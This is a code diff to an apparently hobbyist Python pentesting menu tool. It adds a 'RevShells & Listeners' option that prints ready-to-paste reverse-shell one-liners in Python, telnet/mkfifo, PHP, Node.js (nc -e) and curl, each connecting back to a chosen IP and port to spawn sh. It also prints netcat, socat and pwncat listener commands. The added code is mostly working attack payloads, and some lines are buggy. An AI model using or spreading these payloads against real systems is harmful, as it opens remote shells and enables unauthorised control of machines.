@@ -198,24 +198,66 @@ def wpscan_tool():
 
 
 def shell():
+
+        
+    def reverse():
+        listen = input("Enter Listener IP: (like 192.168.1.1): ")
+        port = input("Listner POrt: ")
+
+        print("\nChoose scan type:")
+        print("1. Python RevShell")
+        print("2. Telner RevSHell") 
+        print("3. PHP RevShell ")
+        print("4. Node.js RevShell")
+        print("5. Curl Revshell")
+
+        choice = input("\nEnter number (1-5): ")
+
+        if choice == "1":
+            print(f"""export RHOST="{listen}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""")
+        elif choice == "2":
+            print(f"""TF=$(mktemp -u);mkfifo $TF && telnet {listen} {port} 0<$TF | sh 1>$TF'""")
+        elif choice == "3":
+            print(f"""php -r '$sock=fsockopen("{listen}",{port});shell_exec("sh <&3 >&3 2>&3");'""")
+        elif choice == "4":
+            print(f"""require('child_process').exec('nc -e sh {listen} {port}')""")
+        elif choice == "5":
+            print(f"""C='curl -Ns telnet://{listen}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null""")
+        elif choice == 6:
+            cmd = f""
+        else:
+            print("Wrong choice!")
+            exit()
+
+    def listeners():
+        print("1.Netcat Listener (nc)")
+        print("2.Socat Listener")
+        print("3.PwnCat Python")
+        choice = int(input("Which Listner Do you want to run : "))
+        port = input("Whice port do you want start Listening: ")
+
+        if choice == 1:
+            cmd = f"nc -lvnp {port}"
+        elif choice == 2:
+            cmd = f"socat -d -d TCP-LISTEN:{port} STDOUT"
+        elif choice == 3:
+            cmd = f"python3 -m pwncat -lp {port}"
+
+        print(f"Paste This in Your Terminal: {cmd}")
+
+
+
+
     print("ReverseShell && Listeners")
-    target = input("Enter Listener IP: (like 192.168.1.1): ")
-    port = input("Listner POrt: ")
-
-    print("\nChoose scan type:")
-    print("1. Python RevShell")
-    print("2. Perl RevShell") 
-    print("3. PHP RevShell ")
-    print("4. Find services -sV")
-    print("5. Find OS -O")
-
-    choice = input("\nEnter number (1-5): ")
-
-    if choice == "1":
-        print("""export RHOST="{target}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""")
+    print("1: Revshells")
+    print("2: Listners")
+    firstq = input("Choose Your Option: ")
+    if firstq == "1":
+        reverse()
+    elif firstq == "2":
+        listeners()
     else:
-        print("Wrong choice!")
-        exit()
+        print("Wrong")
 
 
 def manu():
@@ -223,6 +265,7 @@ def manu():
     print(Back.GREEN + "2: Nmap Scan Ai Analyzer" + Style.RESET_ALL )
     print(Back.GREEN + "3: FFUF (directry/subdomain/files Bruteforce Tool)" + Style.RESET_ALL)
     print(Back.GREEN + "4: WPscan (usage with api)" + Style.RESET_ALL)
+    print(Back.GREEN + "5: RevShells & Listeners" + Style.RESET_ALL)
     choice = int(input("Select A Tool To Use: "))
 
     if choice == 1:
